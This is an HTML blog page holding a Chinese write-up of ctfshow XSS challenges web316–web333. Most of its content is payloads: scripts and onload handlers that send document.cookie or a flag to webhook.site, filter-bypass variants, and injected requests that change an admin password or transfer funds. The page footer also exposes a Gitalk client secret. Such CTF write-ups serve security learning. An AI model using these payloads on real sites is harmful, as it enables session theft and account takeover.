@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]XSS | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web316
+&lt;script&gt; 
+var img=document.createElement(&quot;img&quot;);img.src=&quot;https://webhook.site/49474d84-b4ed-..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]XSS</h2>
+            <div class="post-date">2024-03-21</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowxss.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web316">web316</h2>
+<pre><code class="language-js">&lt;script&gt; 
+var img=document.createElement(&quot;img&quot;);img.src=&quot;https://webhook.site/49474d84-b4ed-42e0-ae17-d0e467b6efbf/?cookie=&quot;+document.cookie; 
+&lt;/script&gt;
+</code></pre>
+<h2 id="web317">web317</h2>
+<p>检测不能有script</p>
+<pre><code class="language-js">&lt;body onload=&quot;window.location.href='https://webhook.site/49474d84-b4ed-42e0-ae17-d0e467b6efbf/?cookie='+document.cookie&quot;&gt;
+</code></pre>
+<h2 id="web318">web318</h2>
+<h2 id="web319">web319</h2>
+<p>同上</p>
+<h2 id="web320">web320</h2>
+<p>检测不能有空格</p>
+<pre><code class="language-js">&lt;body/onload=&quot;window.location.href='https://webhook.site/49474d84-b4ed-42e0-ae17-d0e467b6efbf/?cookie='+document.cookie&quot;&gt;
+</code></pre>
+<h2 id="web321">web321</h2>
+<h2 id="web322">web322</h2>
+<h2 id="web323">web323</h2>
+<h2 id="web324">web324</h2>
+<h2 id="web325">web325</h2>
+<h2 id="web326">web326</h2>
+<p>同上</p>
+<h2 id="web327">web327</h2>
+<p>变为了存储型，还是用前面的payload<br>
+这里发件人和收件人需要为admin😅<br>
+<img src="https://fallingskies22.github.io/post-images/1710992003648.png" alt="" loading="lazy"></p>
+<h2 id="web328">web328</h2>
+<p>注册账号时设置密码为如下：</p>
+<pre><code class="language-js">&lt;script&gt; 
+var img=document.createElement(&quot;img&quot;);img.src=&quot;https://webhook.site/51a60760-badf-40f7-9332-644c2243821d/?cookie=&quot;+document.cookie; 
+&lt;/script&gt;
+</code></pre>
+<p>可以接收到admin用户的cookie，利用cookie查看用户管理页面。<br>
+<img src="https://fallingskies22.github.io/post-images/1710994385864.png" alt="" loading="lazy"></p>
+<h2 id="web329">web329</h2>
+<p>用上题方法接收到cookie，但不能访问用户管理页面。<br>
+直接偷取html页面中信息。</p>
+<pre><code class="language-js">&lt;script&gt;
+$('.laytable-cell-1-0-1').each(function(index,value){
+    if(value.innerHTML.indexOf('ctfshow{')==0){
+        window.location.href='https://webhook.site/1ebb0c8e-2bbd-4b8d-b9a5-0979e9ee8ec9?flag='+value.innerHTML; 
+    }
+});
+&lt;/script&gt;
+</code></pre>
+<h2 id="web330">web330</h2>
+<p>用户名处存在xss，注册用户名如下，修改admin用户密码</p>
+<pre><code class="language-js">&lt;script&gt;window.location.href='http://127.0.0.1/api/change.php?p=123';&lt;/script&gt;
+</code></pre>
+<h2 id="web331">web331</h2>
+<p>修改密码处改为了post提交数据</p>
+<pre><code class="language-js">&lt;script&gt;$.ajax({url:'http://127.0.0.1/api/change.php',type:'post',data:{p:'123'}});&lt;/script&gt;
+</code></pre>
+<h2 id="web332">web332</h2>
+<p>注册一个用户名为123的用户。<br>
+注册一个用户名如下的用户。</p>
+<pre><code class="language-js">&lt;script&gt;$.ajax({url:'http://127.0.0.1/api/amount.php',type:'post',data:{u:'123',a:'10000'}});&lt;/script&gt;
+</code></pre>
+<p>再回去看123用户已经有很多钱了😗</p>
+<h2 id="web333">web333</h2>
+<p>同上</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowjava-fan-xu-lie-hua/">
+                  <h3 class="post-title">
+                    [ctfshow]JAVA反序列化
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
